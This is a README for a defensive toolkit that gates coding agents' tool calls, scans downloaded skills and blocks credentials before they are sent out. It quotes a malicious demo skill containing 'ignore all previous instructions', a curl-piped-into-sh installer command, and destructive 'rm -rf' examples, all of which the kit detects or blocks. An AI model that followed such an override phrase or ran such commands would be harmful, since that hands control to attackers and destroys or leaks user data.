# Jev Agent Kit

Typed decisions for agent workflows, using [TypeSafe's Jev](https://typesafe.ai).

Your coding agent writes the code. Along the way it keeps making small judgment calls: did
that message claim the tests passed, should this request go to a person, is this tool call
safe to send anywhere? Jev is a model built for questions like these. You ask a narrow,
typed question and it returns a probability for each answer you defined, not a paragraph.
Your code reads the numbers and decides what happens next.

This kit connects Jev to Claude Code, Codex and Hermes Agent. It includes a Python client, a
JSON command-line tool, a skill that teaches your agent how to ask good questions, and
optional hooks that check tool calls before they run.

## Why use it

- **Small, focused checks.** A typed answer is a handful of numbers rather than a paragraph,
  so a check adds little to a workflow and its result is easy for code to use.
- **Repeatable answers.** Independent tests found Jev gives the same answer to the same
  question far more consistently than LLM judges (see
  [What others have measured](#what-others-have-measured)). That suits checks you run every
  time.
- **Clear division of labor.** Code does what code is good at (counting, matching, reading
  test reports). Jev interprets language. Your code combines the two.
- **A record of every decision.** Each answer is written to a receipt you can review and
  later use to measure how far to trust Jev on your own work.

## One example: "all tests pass"

Agents sometimes finish with "All tests pass" when no test ran. Here the kit catches it:

```text
Agent says:    'Refactored the parser and cleaned up the imports. All tests pass.'
Commands run:  git diff --stat, ruff check src, git add -A
Test reports:  0  (0 tests passed, counted in code)
Jev:           does the message claim the tests passed?  p(yes)=0.96
Verdict:       the claim is not backed by a test report; ask the agent to run them
```

Two things happened. Code looked for test reports from this session and found none. Jev read
the agent's final message and judged that it claims the tests passed. Put together, the claim
has nothing behind it, so the agent is asked to run the tests.

Neither part could do this alone. Code can count test reports but cannot reliably tell
whether a sentence claims success; Jev can read the sentence but should not be trusted to
count. Run it yourself in the next section.

## Try it in a minute

You need Python 3.11 or later. No account or API key is needed for anything in this section.

```sh
git clone https://github.com/nanoDBA/jev-agent-kit.git
cd jev-agent-kit
python -m pip install -e .
python examples/verify_claim.py
```

The demos run offline: where a Jev answer is needed, they use a fixed, scripted answer
instead of calling the service. What that changes is explained in
[How the kit stays safe](#how-the-kit-stays-safe). Keep working in the repository root so the
relative paths below work. If `jev-kit` is not on your PATH after installing, use
`python -m jev_kit.cli` instead.

### Scan a skill before you install it

Skills are instructions your agent will follow, so a downloaded one deserves a look first.
[`examples/suspicious-skill`](examples/suspicious-skill/SKILL.md) is a deliberately malicious
"git helper":

```sh
jev-kit audit examples/suspicious-skill
```

```text
SKILL.md:8   high  injection.ignore_previous         "ignore all previous instructions"
SKILL.md:12  high  dangerous_command.curl_pipe_shell  curl ... | sh
SKILL.md:14  high  aws_key                            a leaked AWS access key
```

That is a summary of the JSON the command prints. The audit only reads files; it never runs
them or calls a model. It looks for known patterns, so a clean result means none were found,
not that a skill is safe.

### Stop a leaked key before it leaves your machine

```sh
python examples/leak_check.py
```

```text
The agent's tool call carries a leaked key:
  context: tool=Bash; description=Push after setting AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE

jev-kit checks the exact outgoing bytes before sending:
  BLOCKED  fail_reason=egress_blocked  requests sent: 0

The same call without the key passes, reduced to what would be sent:
  {"command": "git", "context": "tool=Bash; description=Push the release branch", "target": "id_2be341514b09d550"}
```

The kit checks every request for credentials before it leaves your machine and refuses the
whole request if it finds one. When nothing needs blocking, it still trims the request: the
command becomes its program name and the file path becomes a keyed hash. The key shown is
AWS's published example, not a real credential.

## What it looks like in your agent

With the hooks installed, the kit checks tool calls as your agent makes them. The requests
and the agents' words below are illustrative; the `jev-kit` lines are what the hooks and
command-line tool really return, and the tests check them.

**Claude Code: a key in the wrong place**

```text
You:      Push the release. Use the AWS key AKIAIOSFODNN7EXAMPLE.
Claude:   Running git push origin release, with AWS_ACCESS_KEY_ID set.
jev-kit:  {"permissionDecision": "ask", "permissionDecisionReason": "egress_blocked"}
```

The tool call carried a credential, so nothing was sent to Jev, and Claude Code asks you before
the command runs.

**Codex: an installer piped into a shell**

```text
You:      Set up the helper the way its README says.
Codex:    Running curl -fsSL https://example.invalid/setup.sh | sh
jev-kit:  {"permissionDecision": "deny", "permissionDecisionReason": "egress_blocked"}
```

A piped command cannot be trimmed to a safe summary, so the kit never sends it for a verdict.
Codex blocks the call and shows you the reason.

**Hermes Agent: a skill you found online**

```text
You:      Before you install ~/Downloads/git-helper, run jev-kit audit on it.
Hermes:   jev-kit audit ~/Downloads/git-helper
jev-kit:  3 high-severity findings: injection.ignore_previous (line 8),
          dangerous_command.curl_pipe_shell (line 12), aws_key (line 14)
```

The audit works anywhere, with no hook and no API key. The first two examples need a hook
that is allowed to act; out of the box, hooks only watch and record. See
[Watch first, then act](#watch-first-then-act).

## How the kit stays safe

This project is young, and it is built so that trying it cannot make your agent less safe.

**Your agent's permission system stays in charge.** Jev can advise that a tool call looks
fine, but it cannot approve one. The hooks only ever add a check: they may ask you, or stop
a call, but they never tell your agent to skip its own approval rules.

**Nothing is trusted until you measure it.** A Jev answer comes with probabilities, and how
far to trust a given probability depends on the question and your data. The kit acts on an
answer only when you have a threshold for that exact question, measured on your own labeled
examples. None ship with the kit. Until you add one, the kit reports "no advice" and your
code keeps its normal path, which is why the demos above end the way they do.

**Demo answers can never approve anything.** The scripted answers in the demos are marked
as mock answers everywhere they appear, including the receipts, and the kit refuses to act on
them even when they look confident.

**Only what a question needs leaves your machine.** Each question declares the fields it
uses; everything else stays local. Commands are cut to their program name, paths become
keyed hashes, and a request containing a credential is refused. Details are in
[What leaves your machine](#what-leaves-your-machine).

### Watch first, then act

The hooks start in **shadow mode**: with an API key configured they ask Jev and record the
answer, and either way they change nothing. Your
agent behaves exactly as before, and you collect evidence about how Jev would have answered.

**Enforce mode** lets the hooks act on their checks. Turn it on only with the environment
owner's approval, after measuring thresholds on labeled data. Two stops work without any
calibration: a request containing a credential, and a command that cannot be safely
summarized. Everything else, with today's uncalibrated question sets, is sent to you, even
harmless calls such as `ls`.

| Host | What the hook returns when a check does not pass in enforce mode |
| --- | --- |
| Claude Code | `permissionDecision: "ask"`: Claude Code asks you |
| Codex | `permissionDecision: "deny"` and exit code `2`: Codex blocks the call |
| Hermes Agent | `action: "block"`: Hermes stops the call |

When every check passes, a hook returns no decision (`{}` or `None`), and your agent's usual
rules apply.

## More examples

### See what Jev returns for a judgment call

A support request arrives: should code handle it, a specialist model, or a person?

```sh
python examples/route_request.py
```

```text
request: 'Customer says order 1182 was charged twice and asks for a refund.'
Which handler should take it?
  deterministic   #                    0.05
  specialist_llm  #####                0.24
  human           ##############       0.71
route:   no_advice
handled: specialist_llm
```

Jev returns a probability for every option you defined. The answer in this demo is scripted,
so the kit reports `no_advice` and the code uses its default, a specialist model. With a
threshold measured on your own requests, a confident `human` would come back as `accept`, and
your code could send refund disputes straight to a person. These numbers show the shape of an
answer; they are not a measurement of Jev's accuracy.

### Read the receipt a decision leaves

```sh
python examples/show_receipt.py
```

```text
Decision receipt (one JSONL line; long ids and digests shortened):
  question_id       route
  question_set      preflight-route v1
  fingerprint       sha256:...
  requested_model   jev-1.13.0
  served_model      jev-1.13.0
  model             mock
  distribution      deterministic 0.05, human 0.71, specialist_llm 0.24
  threshold_status  none
  route             no_advice
  sent_digest       sha256:...
Commit marker: 1 decision line for this call, written durably.
```

| Field | What it tells you |
| --- | --- |
| `fingerprint` | Identifies the exact question, model and data rules. A threshold belongs to one fingerprint, so changing any of them retires old measurements. |
| `requested_model`, `served_model` | The pinned model version, and the version that answered. A mismatch is rejected. |
| `model` | Who really answered. Here it is `mock`, so nobody can mistake it for Jev. |
| `distribution` | The whole answer, not just the top choice, so you can measure thresholds later. |
| `threshold_status` | Whether a measured threshold exists for this question. |
| `sent_digest` | A hash of the exact bytes sent. The request text itself is not stored. |

Every decision is written like this before the kit answers. The commit marker tells a
complete record apart from one cut short by a crash. These receipts are what you measure
thresholds from.

### How the "all tests pass" check counts

The example at the top counts tests only from the test runner's own JUnit XML report
(`pytest --junitxml`, or your runner's equivalent), never from the commands the agent ran:
`pytest -V` exits 0 without running a test, and `pytest || echo done` hides a failure. No
report means zero. That shows tests ran and passed, not that they were the right ones.

## What others have measured

These are other people's measurements, not ours, and each comes with the author's own
caveats. Details and more sources are in
[our research notes](docs/research/10-examples-and-evidence.md).

| Source | What they measured | Result | Caveat |
| --- | --- | --- | --- |
| [jev-as-a-judge](https://github.com/danielgshea/jev-as-a-judge) | 5 agent runs, each judged 100 times, against human pass/fail labels | Matched every human label. The LLM judges' repeat variance was 92x to 913x higher. $0.00035 and 0.44 s per call | Small corpus; observational |
| [PrimeLine](https://primeline.cc/blog/typesafe-jev-pre-registered-test) | Pre-registered, about 9,750 calls in all, against Claude Haiku on the developer's own tasks | Won one task (65.8% vs 54.6%) and lost another (90.7% vs 97.8%). Separately, on 2,600 pooled public-dataset items: about 92% accurate on the 73% answered at confidence 0.9 or above | One developer's data; "not a portable benchmark" |
| [jev-phishing-bench](https://github.com/anisselbd/jev-phishing-bench/blob/main/results/report.md) (summarized by [Rajesh Beri](https://www.beri.net/article/typesafe-jev-typed-decision-model-calibration-decomposition-shadow-eval)) | 2,000 emails (1,000 phishing, 1,000 legitimate), against Claude Haiku | One question, all 2,000 emails: 62.6% vs 81.3%. Five narrow questions per model, combined by a logistic model trained on 1,000 emails and tested on the other 1,000: 95.0% vs 93.2%, not a significant difference | Synthetic email bodies; labels from reputation feeds; the combiner is trained |
| [Jev-Calibration](https://github.com/AnthusAI/Jev-Calibration) | Sentiment: 8,801 items for raw confidence, 3,521 held out for calibration | Choice confidence (the top label's probability) was weak below 0.95. Calibration cut the expected calibration error of the yes/no P(positive) from 0.117 to 0.008 | One task; the dataset's neutral labels are arbitrary by design |

Across these studies, Jev's clearest strength is giving the same answer twice, at a low cost
per call. Accuracy depends on the task and on how the question is split up, and confidence
has to be calibrated for each question. That is why this kit asks narrow questions, keeps
facts in code, and acts on nothing until a threshold is measured on your data. TypeSafe
publishes larger speed and cost multiples; we found no independent test of those, so treat
them as vendor claims. This project has not measured token, cost or latency savings, and an
extra check that replaces nothing adds cost.

## Use the CLI

### Send a JSON request

[`examples/requests/route.json`](examples/requests/route.json) contains this complete request:

```json
{
  "schema_version": 1,
  "op": "decide",
  "question_set_path": "skills/jev-runtime/questions/preflight-route.json",
  "state": {
    "request": "Customer says order 1182 was charged twice and asks for a refund."
  },
  "mode": "shadow"
}
```

With both `TYPESAFE_API_KEY` and `TYPESAFE_API_KEY_COMMAND` unset, run:

```sh
jev-kit --input examples/requests/route.json
```

Expected output:

```json
{"schema_version":1,"status":"error","reason":"config","records":[]}
```

Without an API key, the command-line tool cannot ask Jev, so it reports a configuration
error. It has no demo mode; the Python demos above provide scripted answers. With credentials
configured, the same command calls the service, so read
[Recording real evidence](#recording-real-evidence-optional) first.

The CLI also reads one JSON object from standard input. In Bash or zsh:

```sh
jev-kit < examples/requests/route.json
```

In PowerShell 7:

```powershell
Get-Content -Raw examples/requests/route.json | jev-kit
```

Windows PowerShell 5.1 adds a byte-order mark to piped text, which the CLI rejects as invalid
JSON. There, pass the file instead: `jev-kit --input examples/requests/route.json`.

Both forms return the same response. Exit code `0` means the CLI produced a response,
including an error response; it does not mean approval, so read `status` and each record's
`route`. Malformed JSON or an unusable invocation returns exit `2`. The
[CLI schemas](docs/schemas/README.md) describe the request and response formats, including
`decide_batch` and `record_outcome`.

### Preview a skill install

```sh
jev-kit install --scope repo
```

This prints a JSON plan with `"applied":false` for `.claude/skills`, `.agents/skills` and
`.hermes/skills`, and changes no files. Use `--scope user` to preview a user-wide install.
Installing the skill and registering a tool hook are separate steps; see
[Add it to your agent](#add-it-to-your-agent).

## Choose a question type

| Type | Use it for | What Jev returns |
| --- | --- | --- |
| Noul | A yes/no judgment, such as whether a message claims the tests passed | The probability of yes |
| Choice | A fixed menu, such as code, a specialist model or a person | A probability for each option |
| Score | A rating on a scale whose levels you define | A probability for each level |

Keep arithmetic, counts, date comparisons and exact text matching in code, and give Jev the
facts it needs for the judgment rather than a whole transcript. A confident answer does not
prove those facts were complete or correct.

The kit ships four [question sets](skills/jev-runtime/questions/): `preflight-route`,
`postflight-verify`, `stop-or-continue` and `tool-call-gate`. The
[runtime skill](skills/jev-runtime/SKILL.md) explains how to frame questions, check that
enough evidence is available, and handle uncertain answers.

Every answer comes back with one of three routes:

| Route | What your code should do |
| --- | --- |
| `accept` | The answer cleared a threshold you measured. Act on it; your agent's permission checks still apply. |
| `ask` | A check did not pass, or something failed. Ask a person or run a deterministic check. |
| `no_advice` | There is no usable answer yet. Keep your normal path. |

For TypeSafe's API, see [the vendor documentation](https://docs.typesafe.ai/api.md).

## Inspect a tool-call gate, offline

```sh
python examples/gate_walkthrough.py
```

The example describes `rm -rf ./build`; it never runs that command. It shows how the request
is trimmed, and a scripted answer to three questions about the proposed action:

```text
destructive        p(yes)=0.97  -> ask
exfiltrates        p(yes)=0.02  -> ask
widens_permission  p(yes)=0.01  -> ask
```

All three come back as `ask` because demo answers can never clear a check. The trimmed request
is:

```json
{
  "command": "rm",
  "context": "tool=Bash; description=Clean the build folder",
  "target": "id_7dcb134b1ad03cd1"
}
```

The command is only `rm`: flags and arguments are removed, so this field alone cannot tell
`rm file` from `rm -rf /`. The target is a keyed hash. `context` is plain text, so it needs an
explicit opt-in for live calls. The hooks no longer add the working directory to it, but a
description can still name a folder.

## Add it to your agent

With the environment owner's approval, follow the guide for your host. Each guide starts in
shadow mode and covers installing the skill separately from registering the hook:

- [Claude Code](docs/guides/claude-code.md)
- [Codex](docs/guides/codex.md)
- [Hermes Agent](docs/guides/hermes.md)

The installer only writes changes when you pass `--apply`. It links to `skills/jev-runtime`
where it can and otherwise copies the files; moving or deleting a linked checkout breaks the
install.

## What leaves your machine

Only fields a question set declares are sent, after they are trimmed. For `tool-call-gate`:

| Field | What is sent |
| --- | --- |
| `command` | The program name only. `rm -rf ./build` becomes `rm`. |
| `target` | A keyed hash of the file path or URL, never the path itself. |
| `context` | Plain text: the tool name, plus the description in Claude Code, turn id in Codex, or task id in Hermes. The hooks do not add the working directory, but a description or id can still contain a folder name. Email addresses, IP addresses and phone numbers are masked. |

The gate always includes `context`. Unless `agent_context` is in `JEV_KIT_SOURCE_ALLOWLIST`,
live gate requests are refused before sending, so no evidence is collected. Adding it means
accepting that directory names and other unmasked context can leave the machine. The routing
example's `request` field uses the separate source type `agent_request`.

The kit scans the exact outgoing bytes for credentials and other prohibited data and refuses
a request that matches. No scanner catches every secret. Source-code fields are refused
outright for now, and log fields keep only level keywords and masked placeholders.

Receipts hold decision details and digests, never raw state or API keys. See
[ADR 0002](docs/adr/0002-egress-policy.md) for the policy and its accepted risks.

## Recording real evidence (optional)

Live calls send data to TypeSafe and may cost money. Get authorization for that before adding
credentials; the demos need none of this.

| Variable | Purpose |
| --- | --- |
| `TYPESAFE_API_KEY` or `TYPESAFE_API_KEY_COMMAND` | API key, or a JSON argument list for a command that prints it from your secret store. |
| `JEV_KIT_HMAC_KEY` | 32 random bytes, base64url-encoded, for keyed hashes such as `target`. Keep it secret. |
| `JEV_KIT_SOURCE_ALLOWLIST` | Approved source types, comma-separated. `agent_context` permits the gate context; `agent_request` permits the routing example's text. |
| `JEV_KIT_ATTESTATION` | Path to a JSON file recording inventory inclusion, its date and DPA status. Live calls are refused without a valid attestation. |
| `JEV_KIT_RECEIPTS_DIR` | Optional absolute receipt folder; defaults to a per-user data folder. |

An attestation has fields such as `{"inventory": true, "inventory_date": "2026-09-26",
"dpa": true}`. Record your actual status and date; do not copy these values.

The model is pinned to `jev-1.13.0`, and an answer from any other version is rejected.
Measure thresholds from authorized real answers, with independent labels and held-out data.
A threshold belongs to one exact question and set of data rules, so changing either retires
it. Collecting evidence does not by itself authorize turning on enforce mode.

## Development

See [CONTRIBUTING.md](CONTRIBUTING.md) for development dependencies. Then run:

```sh
python -m pytest
python -m ruff check src tests scripts tools examples
python -m mypy
```

Tests never call the live API. `tests/test_docs_examples.py` checks the examples and outputs
shown here. Design decisions live in [docs/adr](docs/adr/), specifications in
[docs/specs](docs/specs/), and the evidence-backed skill maintenance workflow in
[this guide](docs/evidence-backed-maintenance.md).

Report security problems privately as described in [SECURITY.md](SECURITY.md).

## License

MIT. See [LICENSE](LICENSE).

TypeSafe, Jev, Claude, Claude Code, Codex, and Hermes Agent are trademarks of their respective
owners. This project is independent and is not affiliated with or endorsed by them.
